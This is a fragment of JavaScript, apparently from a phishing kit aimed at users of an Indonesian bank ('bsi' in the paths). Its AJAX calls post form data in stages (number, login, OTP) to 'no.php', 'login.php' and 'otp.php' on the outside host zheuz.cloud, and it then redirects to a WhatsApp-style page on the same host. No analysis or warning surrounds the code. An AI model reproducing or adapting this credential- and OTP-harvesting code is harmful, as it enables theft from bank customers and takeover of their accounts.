...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://zheuz.cloud/bsi/kh3d/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://zheuz.cloud/bsi/kh3d/login.php',
...
$.ajax({
 type: 'POST',
 url: 'https://zheuz.cloud/bsi/kh3d/otp.php',
 async: false,
 dataType: 'JSON',
...
function getcs(){
 $("#djload").show();   
  ...
  audio1 = document.getElementById("bsi");
    ...
    audio4.loop = false
setTimeout(function(){  
location.href='https://zheuz.cloud/wa/kh3d';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1000);      
